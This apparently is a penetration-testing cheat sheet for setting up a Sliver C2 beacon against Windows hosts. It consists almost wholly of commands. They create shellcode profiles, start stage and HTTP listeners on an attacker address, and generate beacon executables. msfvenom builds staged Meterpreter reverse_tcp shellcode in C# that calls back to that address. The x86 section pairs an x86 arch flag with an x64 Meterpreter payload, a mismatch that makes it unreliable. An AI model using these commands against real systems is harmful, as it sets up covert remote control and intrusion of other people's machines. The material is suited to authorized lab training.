# Basic Sliver Beacon
Setup basic stager and listener on Sliver C2

## References
All content for Sliver shell code runner from https://github.com/beauknowstech/OSEP-Everything/tree/main/AMSI

## Setup for x86 windows host
```bash
# Setup profile for staged payload with arch type as x86
sliver > profiles new --http 192.168.200.43:80 --format shellcode --arch 386 local86

# Start stage-listener x86 profile
sliver > stage-listener --url tcp://192.168.200.43:8086 --profile local86

# Start Listener
sliver > http -L 192.168.200.43 -l 80

# generate a generic (stageless) payload
sliver > generate --http 192.168.200.43:80 --arch 386 --save . --name http-beacon-86.exe

# create initial staged payload with msfvenom pointing to stage-listener IP/Port for x86
┌──(kali㉿kali)-[~/Desktop/SliverC2-HTB]
└─$ msfvenom --platform windows --arch x86 --format csharp --payload windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.43 LPORT=8086 EXITFUNC=thread
```

## Setup for x64 windows host
```bash
# Setup profile for staged payload with arch type as x64
sliver > profiles new --http 192.168.200.43:80 --format shellcode local64

# Start stage-listener 
sliver > stage-listener --url tcp://192.168.200.43:8064 --profile local64

# Start Listener
sliver > http -L 192.168.200.43 -l 80

# generate a generic (stageless) payload
sliver > generate --http 192.168.200.43:80 --save . --name http-beacon.exe

# create initial staged payload with msfvenom pointing to stage-listener IP/Port for x64
┌──(kali㉿kali)-[~/Desktop/SliverC2-HTB]
└─$ msfvenom --platform windows --arch x64 --format csharp --payload windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.43 LPORT=8064 EXITFUNC=thread
```
